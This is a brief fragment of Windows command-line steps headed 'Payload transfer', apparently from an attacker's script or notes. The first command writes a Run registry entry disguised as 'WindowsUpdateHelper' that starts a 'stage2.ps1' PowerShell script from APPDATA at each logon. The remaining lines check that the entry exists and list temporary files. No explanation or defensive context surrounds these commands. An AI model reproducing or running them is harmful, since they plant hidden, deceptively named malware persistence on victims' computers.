
# Payload transfer
reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v 'WindowsUpdateHelper' /t REG_SZ /d "powershell.exe -NoP -File $env:APPDATA\stage2.ps1" /f
Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsUpdateHelper' -ErrorAction SilentlyContinue
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
